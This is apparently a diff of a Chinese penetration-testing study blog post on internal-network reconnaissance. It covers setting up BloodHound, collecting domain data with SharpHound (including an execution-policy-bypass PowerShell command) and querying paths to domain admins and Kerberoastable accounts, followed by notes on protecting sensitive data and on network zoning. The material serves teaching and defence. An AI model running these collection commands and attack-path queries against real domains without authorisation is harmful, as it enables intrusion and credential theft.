+<h2 id="2-14-域分析工具-Blood-Hound"><a href="#2-14-域分析工具-Blood-Hound" class="headerlink" title="2.14 域分析工具 Blood Hound"></a>2.14 域分析工具 Blood Hound</h2><p>​        BloodHound 是一款免费的工具。一方面，BloodHound 通过图与线的形式，将域内用户、计算机、组、会话、ACL，以及域内所有的相关用户、组、计算机、登录信息、访问控制策略之间的关系，直观地展现在 Red Team 成员面前，为他们更便捷地分析域内情况、更快速地在域内提升权限提供条件。另一方面，BloodHound 可以帮助Blue Team 成员更好地对己方网络系统进行安全检查，以及保证域的安全性。BloodHound 使用图形理论，在活动目录环境中自动理清大部分人员之间的关系和细节。使用BloodHound，可以快速、深入地了解活动目录中用户之间的关系，获取哪些用户具有管理员权限、哪些用户对所有的计算机都具有管理员权限、哪些用户是有效的用户<br>组成员等信息。</p>
+<p>​        BloodHound 可以在域内导出相关信息，将采集的数据导入本地 Neo4i 数据库，并进行展示和分析。Neo4j 是一款 NoSQL 图形数据库，它将结构化数据存储在网络内而不是表中。BloodHound 正是利用 Neo4j 的这种特性，通过合理的分析，直观地以节点空间的形式表达相关数据的。Neo4j 和 MySQL 及其他数据库一样，拥有自己的查询语言 Cypher Query Language。因为 Neo4j 是一款非关系型数据库，所以，要想在其中进行查询，同样需要使用其特有的语法。</p>
+<h3 id="2-14-1-配置环境"><a href="#2-14-1-配置环境" class="headerlink" title="2.14.1 配置环境"></a>2.14.1 配置环境</h3><p>​        首先，需要难备一台安装了 Windows 服务器操作系统的机器。为了方便、快捷地使用 Neo4j 的Web管理界面，推荐使用 Chrome 或者火狐浏览器。Neo4j 数据库的运行需要 Java 环境的支持。</p>
+<p>​         详细安装教程可以参考官方教程：<a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/installation/windows.html">https://bloodhound.readthedocs.io/en/latest/installation/windows.html</a></p>
+<pre><code class="hljs bash"><span class="hljs-comment"># 安装neo4j</span>
+C:\&gt; neo4j.bat install-service
+<span class="hljs-comment"># 启动neo4j,URL：http://localhost:7474/，用户名：neo4j 密码：neo4j </span>
+C:\&gt; net start neo4j
+<span class="hljs-comment"># 双击 BloodHound.exe 连接即可</span></code></pre>
+
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220604160322400.png" alt="image-20220604160322400" style="zoom: 50%;" />
+
+<p><strong>界面左上角是菜单按钮和搜索栏：</strong></p>
+<p>三个选项卡分别是数据库信息（Database Info)、节点信息 (Node Info)和分析(Analysis)。</p>
+<ul>
+<li><p>数据库信息选项卡中显示了所分析域的用户数量、计算机数量、组数量、会话数量、ACL数量、关系等信息，用户可以在此处执行基本的数据库管理操作，包括注销和切换数据幸，以及清除当前加载的数据库。</p>
+</li>
+<li><p>节点信息选项卡中显示了用户在图表中单击的节点的信息。</p>
+</li>
+<li><p>分析选项卡中显示了 BloodHound 预置的查询请求和用户自己构建的查询请求。</p>
+</li>
+</ul>
+<p><strong>界面右上角是设置区：</strong></p>
+<p>第一个是刷新功能，BloodHound 将重新计算并绘制当前显示的图形；</p>
+<p>第二个是导出图形功能，可以将当前绘制的图形导出为JSON或PNG文件；</p>
+<p>第三个是导入图形功能，可以导入JSON文件；</p>
+<p>第四个是上传数据功能，BloodHound将对上传的文件进行自动检测，然后获取CSV格式的数据；</p>
+<p>第五个是查看上传状态功能，应该是新增的功能，官方文档并未找到相关描述。</p>
+<p>第六个是更改布局类型功能，用于在分层和强制定向图布局之间切换；</p>
+<p>第七个是设置功能，可以更改节点的折叠行为，以及在不同的细节模式之间切换。</p>
+<h3 id="2-14-2-采集数据"><a href="#2-14-2-采集数据" class="headerlink" title="2.14.2 采集数据"></a>2.14.2 采集数据</h3><p>在使用BloodHound进行分析时，需要调用来自活动目录的三条信息，具体如下。</p>
+<ul>
+<li><p>哪些用户登录了哪些机器？</p>
+</li>
+<li><p>哪些用户拥有管理员权限？</p>
+</li>
+<li><p>哪些用户和组属于哪些组？</p>
+</li>
+</ul>
+<p>​       BloodHound需要的这三条信息依赖于 Power View.ps1 脚本的BloodHound。BloodHound分为两部分，一是PowerShell 采集器脚本（有两个版本，旧版本叫作BloodHound_Old.ps1，新版本叫作SharpHound.ps1),二是可执行文件SharpHound.exe。在大多数情况下，收集此信息不需要系统管理员权限。</p>
+<p><strong>1、SharpHound.ps1 搜集数据</strong></p>
+<p>Repo:  <a target="_blank" rel="noopener" href="https://github.com/SevenC-base/Intranet/blob/master/windows/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/SharpHound.ps1">https://github.com/SevenC-base/Intranet/blob/master/windows/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/SharpHound.ps1</a></p>
+<pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-command</span> <span class="hljs-string">&quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c ALL&quot;</span></code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605210320931.png" alt="image-20220605210320931"></p>
+<p><strong>2、SharpHound.exe 搜集数据</strong></p>
+<p>Windows Server 2008 需要.NET 4.0、4.5、4.6环境，限制较多。</p>
+<p> SharpHound.exe 下载地址：<a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
+<p>.NET 4.0 下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=17718">https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=17718</a></p>
+<p>.NET 4.5.2 下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=42642">https://www.microsoft.com/en-us/download/confirmation.aspx?id=42642</a></p>
+<p>.NET 4.6 下载地址（开发人员工具包）：<a target="_blank" rel="noopener" href="https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net461">https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net461</a></p>
+<p>安装完成需要重启。</p>
+<pre><code class="hljs powershell">SharpHound.exe <span class="hljs-literal">-c</span> all</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605213944548.png" alt="image-20220605213944548"></p>
+<p><strong>3、BloodHound.py 搜集数据</strong></p>
+<p>repo: <a target="_blank" rel="noopener" href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></p>
+<h3 id="2-14-3-导入数据"><a href="#2-14-3-导入数据" class="headerlink" title="2.14.3 导入数据"></a>2.14.3 导入数据</h3><p>​      将搜集的数据压缩包通过BloodHound的图形化界面Upload data按钮上传分析，效果如下：</p>
+  <img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220605221005108.png" alt="image-20220605221005108" style="zoom:50%;" />
+
+<h3 id="2-14-4-查询信息"><a href="#2-14-4-查询信息" class="headerlink" title="2.14.4 查询信息"></a>2.14.4 查询信息</h3><p>​       查询信息一共可分为五个方面：域信息、危险的权限、kerberos 交互、最短路径、自定义查询。</p>
+<ul>
+<li>Domain Information：域信息<br>— Find all Domain Admins：查询所有域管理员<br>— Map Domain Trusts：映射域信任<br>— Find Computers with Unsupported Operating Systems：查找不支持操作系统的计算机</li>
+<li>Dangerous Rights：危险的权限<br>— Find Principals with DCSync Rights：查找具有DCSync权限的主体<br>— Users with Foreign Domain Group Membership：具有外部域组成员资格的用户<br>— Groups with Foreign Domain Group Membership：具有外部域名组成员资格的组<br>— Find Computers where Domain Users are Local Admin：查找域用户是本地管理员的计算机<br>— Find Computers where Domain Users can read LAPS passwords：查找域用户可以读取密码的计算机<br>— Find All Paths from Domain Users to High Value Targets：找到从域用户到高价值目标的所有路径<br>— Find Workstations where Domain Users can RDP：找到域用户可以RDP的工作站<br>— Find Servers where Domain Users can RDP：找到域用户可以RDP的服务器<br>— Find Dangerous Rights for Domain Users Groups：查找域用户组的危险权限<br>— Find Domain Admin Logons to non-Domain Controllers：查找非域控制器的域管理员登录</li>
+<li>Kerberos Interaction：kerberos 交互<br>— Find Kerberoastable Members of High Value Groups：找到高价值群体中能够支持kerberoable的成员<br>— List all Kerberoastable Accounts：列出所有kerberoable用户<br>— Find Kerberoastable Users with most privileges：查找具有大多数特权的Kerberoastable用户<br>— Find AS-REP Roastable Users (DontReqPreAuth)：查找AS-REP Roastable用户(DontReqPreAuth)</li>
+<li>Shortest Paths：最短路径<br>— Shortest Paths to Unconstrained Delegation Systems：到无约束委托系统的最短路径<br>— Shortest Paths from Kerberoastable Users：到达Kerberoastable用户的最短路径<br>— Shortest Paths to Domain Admins from Kerberoastable Users：从Kerberoastable用户到域管理员的最短路径<br>— Shortest Path from Owned Principals：拥有的主体的最短路径<br>— Shortest Paths to Domain Admins from Owned Principals：从拥有的主体到域管理员的最短路径<br>— Shortest Paths to High Value Targets：到高价值目标的最短路径<br>— Shortest Paths from Domain Users to High Value Targets：从域用户到高价值目标的最短路径<br>— Find Shortest Paths to Domain Admins：到域管理员的最短路径</li>
+<li>Custom Queries：自定义查询</li>
+</ul>
+<p>简单测试五个常见的查询：</p>
+<p>1、查找所有域管理员</p>
+<p>点击 <code>Find all Domain Admins</code> 进行查询。</p>
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605223517478.png" alt="image-20220605223517478" style="zoom: 33%;" />
+
+<p>2、查找到达域管理员的最短路径</p>
+<p>点击<code>Find Shortest Paths to Domain Admins</code> 进行查询。</p>
+<img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220605223734006.png" alt="image-20220605223734006" style="zoom:50%;" />
+
+<p>3、查看指定用户与域关联的详细信息</p>
+<p>​      单击某个节点，BloodHound 将使用该节点的相关信息来填充节点信息选项卡。在本节的实验中，单击任意节点，然后选择一个用户名，即可查看该用户的用户名、显示名、密码最后修改时间、最后登录时间、在哪台计算机上存在会话，以及存在会话的计算机是否启动、属于哪些组、拥有哪些机器的本地管理员权限和访问对象对控制权限等。BloodHound能够以图表的形式将这些信息展示出来，并列出该用户在域中的权限，以便Red Team成员在域中进行横向渗透测试。</p>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220605224232840.png" alt="image-20220605224232840" style="zoom:50%;" />
+
+<p>4、查看指定计算机与域的关系</p>
+<p>​      单击任意计算机，可以看到该计算机在域内的名称、系统版本、是否启用、是否允许无约束委托等信息。</p>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220605224411969.png" alt="image-20220605224411969" style="zoom:33%;" />
+
+<p>5、寻找路径</p>
+<p>​      寻找路径的操作与导航软件的操作类似。在 BloodHound 中单击路径图标，会弹出目标节点文本框。将开始节点和目标节点分别设置<br>为任意类型，然后单击三角形按钮。如果存在此类路径，BloodHound将找到所有从开始节点到目标节点的路径，并在图形绘制区域将这些路径显示出来。</p>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220605224839565.png" alt="image-20220605224839565" style="zoom:50%;" />
+
+<h3 id="2-15-5-图例说明"><a href="#2-15-5-图例说明" class="headerlink" title="2.15.5  图例说明"></a>2.15.5  图例说明</h3><p>1、图标说明</p>
+<ul>
+<li><p>蓝色位置图标是<strong>开始节点</strong> ；</p>
+</li>
+<li><p>白色骷髅头是<strong>已拥有节点</strong>；</p>
+</li>
+<li><p>红色靶子图标是<strong>目标节点</strong>；</p>
+</li>
+<li><p>钻石图标则是<strong>高价值目标</strong>；</p>
+</li>
+</ul>
+<p>2、节点说明</p>
+<p>​      节点又细分为6种，分别是 <strong>Users</strong> 用户、<strong>Groups</strong> 组、<strong>Computers</strong> 计算机、<strong>Domain</strong> 域、<strong>GPOs</strong> 组策略对象、<strong>OUs</strong> 组织单位：</p>
+<img src="https://ask.qcloudimg.com/http-save/yehe-5487096/6c63fab3614abd93604eea63c46c2cdb.jpeg" alt="preload" style="zoom:50%;" />
+
+<p>3、名词解释</p>
+<p>​       HasSession：当用户与计算机时进行会话时，凭据会保留在内存中，可用 LSASS 注入或者凭据转储来获取用户凭据，图中该用户在两台计算机上存在会话：</p>
+<img src="https://ask.qcloudimg.com/http-save/yehe-5487096/0e10f009bcea45339e1e36fa168187da.jpeg" alt="preload" style="zoom:50%;" />
+
+<p>​      Contains 可以在OU上添加一个新的ACE，它将继承到该OU下的所有子对象上，比如说在OU上应用GenericAll ACE ，那么所有子对象都将继承GenericAll属性</p>
+<p>​      GpLink 将其设置为链接容器中的对象。</p>
+<h2 id="2-15-敏感数据的防护"><a href="#2-15-敏感数据的防护" class="headerlink" title="2.15 敏感数据的防护"></a>2.15 敏感数据的防护</h2><p>​        内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。可以说，价值较高的数据基本都在内网中。因此，了解攻击者的操作流程，对内网数据安全防护工作至关重要。</p>
+<h3 id="2-15-1资料、数据、文件的定位流程"><a href="#2-15-1资料、数据、文件的定位流程" class="headerlink" title="2.15.1资料、数据、文件的定位流程"></a>2.15.1资料、数据、文件的定位流程</h3><p>​        内网数据防护的第一步，就是要熟悉攻击者获取数据的流程。在实际的网络环境中，攻击者主要通过各种恶意方法来定位公司内部各相关人员的机器，从而获得资料、数据、文件。定位的大致流程如下：</p>
+<ul>
+<li><p>定位内部人事组织结构。</p>
+</li>
+<li><p>在内部人事组织结构中寻找需要监视的人员。</p>
+</li>
+<li><p>定位相关人员的机器。</p>
+</li>
+<li><p>监视相关人员存放文档的位置。</p>
+</li>
+<li><p>列出存放文档的服务器的目录。</p>
+</li>
+</ul>
+<h3 id="2-15-2-重点核心业务机器及敏感信息防护"><a href="#2-15-2-重点核心业务机器及敏感信息防护" class="headerlink" title="2.15.2 重点核心业务机器及敏感信息防护"></a>2.15.2 重点核心业务机器及敏感信息防护</h3><p>​       重点核心业务机器是攻击者比较关心的机器，因此，我们需要对这些机器采取相应的安全防护措施。</p>
+<p>1、核心业务机器</p>
+<ul>
+<li>高级管理人员、系统管理员、财务/人事/业务人员的个人计算机。</li>
+<li>产品管理系统服务器。</li>
+<li>办公系统服务器。</li>
+<li>财务应用系统服务器。</li>
+<li>核心产品源码服务器（T公司通常会架设自己的SVN或者GT服务器)。</li>
+<li>数据库服务器。</li>
+<li>文件服务器、共享服务器。</li>
+<li>电子邮件服务器。</li>
+<li>网络监控系统服务器。</li>
+<li>其他服务器（分公司、工厂）。</li>
+</ul>
+<p>2、敏感信息和敏感文件</p>
+<ul>
+<li>站点源码备份文件、数据库备份文件等。</li>
+<li>各类数据库的Web管理入口，例如phpMyAdmin、Adminer。</li>
+<li>浏览器密码和浏览器Cookie。</li>
+<li>其他用户会话、3389和ipc$连接记录、“回收站”中的信息等。</li>
+<li>Windows无线密码。</li>
+<li>网络内部的各种账号和密码，包括电子邮箱、VPN、FTP、TeamView等。</li>
+</ul>
+<h3 id="2-15-3-应用与文件形式信息的防护"><a href="#2-15-3-应用与文件形式信息的防护" class="headerlink" title="2.15.3 应用与文件形式信息的防护"></a>2.15.3 应用与文件形式信息的防护</h3><p>​        在内网中，攻击者经常会进行基于应用与文件的信息收集，包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等。从总体来看，攻击者一是要了解已攻陷机器所属人员的职位（一个职位较高的人在内网中的权限通常较高，在他的计算机中会有很多重要的、敏感的个人或公司内部文件)，二是要在机器中使用一些搜索命令来寻找自己需要的资料。</p>
+<p>​        针对攻击者的此类行为，建议用户在内网中工作时，不要将特别重要的资料存储在公开的计算机中，在必要时应对Office文档进行加密且密码不能过于简单（对于低版本的Office软件，例如 Office 2003，攻击者在网上很容易就能找到软件来破解其密码；对于高版本的Office软件，攻击者能够通过微软SysInternals Suite 套件中的 ProcDump 来获取其密码)。</p>
+<h2 id="2-16-分析内网段划分情况以及拓扑结构"><a href="#2-16-分析内网段划分情况以及拓扑结构" class="headerlink" title="2.16 分析内网段划分情况以及拓扑结构"></a>2.16 分析内网段划分情况以及拓扑结构</h2><p>​        在掌握了内网的相关信息后，渗透测试人员可以分析目标网络的结构和安全防御策略，获取网段信息、各部门的P地址段，并尝试绘制内网的拓扑结构图。当然，渗透测试人员无法了解内网的物理结构，只能从宏观上对内网建立一个整体认识。</p>
+<h3 id="2-16-1-基本架构"><a href="#2-16-1-基本架构" class="headerlink" title="2.16.1 基本架构"></a>2.16.1 基本架构</h3><p>​        渗透测试人员需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。<br>下面列举一些常见的Web架构：</p>
+<ul>
+<li><p>ASP+Access+ⅡS 5.0/6.0+Windows Sever 2003</p>
+</li>
+<li><p>ASPX+MSSQL+IIS 7.0/7.5+Windows Sever 2008</p>
+</li>
+<li><p>PHP+MySQL+IIS</p>
+</li>
+<li><p>PHP+MySQL+Apache</p>
+</li>
+<li><p>PHP+MySQL+Ngnix</p>
+</li>
+<li><p>JSP+MySQL+Ngnix</p>
+</li>
+<li><p>JSP+MSSQL+Tomcat</p>
+</li>
+<li><p>JSP+Oracle+Tomcat</p>
+</li>
+</ul>
+<h3 id="2-16-2-域内网段划分"><a href="#2-16-2-域内网段划分" class="headerlink" title="2.16.2 域内网段划分"></a>2.16.2 域内网段划分</h3><p>​        在判断内网环境时，首先需要分析内网P地址的分布情况。一般可以通过内网中的路由器、交换机等设备，以及SNMP、弱口令等，获取内网网络拓扑或DNS域传送的信息。大型公司通常都有内部网站，因此也可通过内部网站的公开链接来分析P地址分布情况。网段是怎么划分的？是按照部门划分网段、按照楼层划分网段，还是按照地区划分网段？内网通常可分为DMZ、办公区和核心区（生产区)。</p>
+<img src="/Users/rainmaker/Library/Application%20Support/typora-user-images/image-20220607123344996.png" alt="image-20220607123344996" style="zoom: 33%;" />
+
+
+
+<p><strong>1、DMZ区</strong></p>
+<p>​        DMZ(Demilitarized Zone)非军事化区，也就是隔离区，DMZ区是一个对外服务区，在DMZ区域中存放着一些公共服务器，比如对外的服务器、对外的邮箱等等。用户要从外网访问到的服务，理论上都可以放到DMZ区。</p>
+<p>​        在实际的渗透测试中，大多数情况下，在外围Web环境中拿到的权限都在DMZ中。这个区域不属于严格意义上的内网。如果访问控制策略配置合理，DMZ就会处在从内网能够访问DMZ而从DMZ访问不能内网的状态。</p>
+<p><strong>2、办公区</strong></p>
+<p>​        办公区，顾名思义，是指日常工作区。办公区的安全防护水平通常不高，基本的防护机制大多为杀毒软件或主机入侵检测产品。在实际的网络环境中，攻击者在获取办公区的权限后，会利用内网信任关系来扩大攻击面。不过，在一般情况下，攻击者很少能够直接到达办公区。攻击者如果想进入办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。<br>​        办公区按照系统可分为OA系统、邮件系统、财务系统、文件共享系统、企业版杀毒系统、内部应用监控系统、运维管理系统等，按照网段可分为域管理网段、内部服务器系统网段、各部门分区网段等。</p>
+<p><strong>3、核心区</strong></p>
+<p>​        核心区内一般存放着企业最重要的数据、文档等信息资产（例如域控制器、核心生产机器等)，安全设置也最为严格。根据业务的不同，相关服务器可能存在于不同的网段中。在实际网络环境中，攻击者通过分析服务器上运行的服务和进程，就可以推断出目标主机使用的运维监控管理系统和安全防护系（攻击者在内网中进行横向攻击时，会优先查找这些主机）。核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网段可分为业务网段、运维监控网段、安全管理网段等。</p>
+<p>大型企业网络架构有三层：接入层、汇聚层、核心层。</p>
+<ul>
+<li><p>接入层接入不同的部门，不同的部门属于不同的VLAN，保证了不同部门之间的安全。</p>
+</li>
+<li><p>核心层有两个核心交换机，实现负载均衡和热备份，即使有一个核心交换机宕机了，网络也不会瘫痪。</p>
+</li>
+<li><p>对内服务器有一个IDS入侵检测系统，检测对内服务器的安全。</p>
+</li>
+<li><p>对外服务器有一个 WAF和IDS ，用来检测外网用户对对外服务器的访问。</p>
+</li>
+<li><p>边界防火墙主要是用来进行流量控制、流量过滤和进行内外网NAT转换。</p>
+</li>
+<li><p>在网络出口处，还有IPS入侵检测系统，实时检测是否有异常攻击行为，并及时阻断。</p>
+</li>
+<li><p>出口路由器由两个不同的运营商提供，提供对公网路由。</p>
+</li>
+<li><p>防火墙、IPS 和 边界路由器都有两个，实现负载均衡和热备份。即使任何一个宕机了，都不会影响企业网络的正常运作。</p>
+</li>
+</ul>
+<p><strong>4、安全产品</strong></p>
+<p>​        IDS（Intrusion Detection Systems），只是做些攻击的检测工作，本身并不做防护，它检测到攻击的时候，可能此时攻击已经产生灾难了，所以IDS一般都需要和一些防攻击设备IPS共用；</p>
+<p>​        IPS（Intrusion Prevention System)，它不光对已知的攻击种类能防御，还能检测些异常协议的攻击，比较灵活。</p>
+<ul>
+<li>防火墙是防御系统，属于访问控制类产品</li>
+<li>IDS是入侵检测系统，属于审计类产品</li>
+<li>IPS是入侵防御系统，属于访问控制类产品</li>
+<li>防火墙是基于IP地址和端口来执行访问控制的</li>
+<li>IPS是基于入侵检测来执行访问控制的</li>
+</ul>
+<h3 id="2-16-3-多层域结构"><a href="#2-16-3-多层域结构" class="headerlink" title="2.16.3 多层域结构"></a>2.16.3 多层域结构</h3><p>​        在上述内容的基础上，可以尝试分析域结构。因为大型企业或者单位的内部网络大都采用多层域结构甚至多级域结构，所以，在进行内网渗透测试时，首先要判断当前内网中是否存在多层域、当前计算机所在的域是几级子域、该子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、不同的域之间是否存在域信任关系等。</p>
+<h3 id="2-16-4-绘制内网拓扑图"><a href="#2-16-4-绘制内网拓扑图" class="headerlink" title="2.16.4 绘制内网拓扑图"></a>2.16.4 绘制内网拓扑图</h3><p>​        通过目标主机及其所在域的各类信息，就可以绘制内网的拓扑图了。在后续的渗透测试中，对照拓扑图，可以快速了解域的内部环境、准确定位内网中的目标。</p>
+
         </div>
 
     </div>
@@ -640,15 +1460,15 @@ timeout /NOBREAK /t <span class="hljs-number">35</span> &gt;<span class="hljs-bu
     <section class="share">
         <div class="share-title">分享</div>
         <a class="share-item" target="_blank"
-            href="https://twitter.com/share?text=内网学习笔记一 | 内网信息搜集 - RainMaker&url=http://hasaki-h2.github.io/40b5e599.html">
+            href="https://twitter.com/share?text=内网学习笔记二 | 内网信息搜集 - RainMaker&url=http://hasaki-h2.github.io/40b5e599.html">
             <box-icon type='logo' name='twitter'></box-icon>
         </a>
         <a class="share-item" target="_blank"
-            href="https://www.facebook.com/sharer.php?title=内网学习笔记一 | 内网信息搜集 - RainMaker&u=http://hasaki-h2.github.io/40b5e599.html">
+            href="https://www.facebook.com/sharer.php?title=内网学习笔记二 | 内网信息搜集 - RainMaker&u=http://hasaki-h2.github.io/40b5e599.html">
             <box-icon name='facebook-square' type='logo' ></box-icon>
         </a>
         <!-- <a class="share-item" target="_blank"
-            href="https://service.weibo.com/share/share.php?title=内网学习笔记一 | 内网信息搜集 - RainMaker&url=http://hasaki-h2.github.io/40b5e599.html&pic=">
+            href="https://service.weibo.com/share/share.php?title=内网学习笔记二 | 内网信息搜集 - RainMaker&url=http://hasaki-h2.github.io/40b5e599.html&pic=">
             <div class="n-icon n-icon-weibo"></div>
         </a> -->
     </section>
@@ -706,7 +1526,7 @@ timeout /NOBREAK /t <span class="hljs-number">35</span> &gt;<span class="hljs-bu
   <div class="widget-wrap widget-cate">
     <div class="widget-title"><span>Categories</span></div>
     <div class="widget-inner">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li></ul>
     </div>
   </div>
 
@@ -729,23 +1549,23 @@ timeout /NOBREAK /t <span class="hljs-number">35</span> &gt;<span class="hljs-bu
       <ul>
         
           <li>
+            <a href="/896645eb.html">内网学习笔记七 | 跨域攻击分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/83b61d10.html">内网学习笔记六 | 域控制器安全</a>
+          </li>
+        
+          <li>
+            <a href="/f9f7ea1f.html">内网学习笔记八 | 权限维持分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/687f7c3.html">内网学习笔记五 | 域内横向移动分析及防御</a>
+          </li>
+        
+          <li>
             <a href="/1ed1a532.html">向日葵RCE复现</a>
-          </li>
-        
-          <li>
-            <a href="/334b21e6.html">钉钉RCE复现</a>
-          </li>
-        
-          <li>
-            <a href="/fd778797.html">Xray扫描结果整理小脚本分享</a>
-          </li>
-        
-          <li>
-            <a href="/401ba385.html">内网学习笔记四 | 权限提升分析及防御</a>
-          </li>
-        
-          <li>
-            <a href="/ddad802f.html">2021-12月CISP-PTE考试总结</a>
           </li>
         
       </ul>
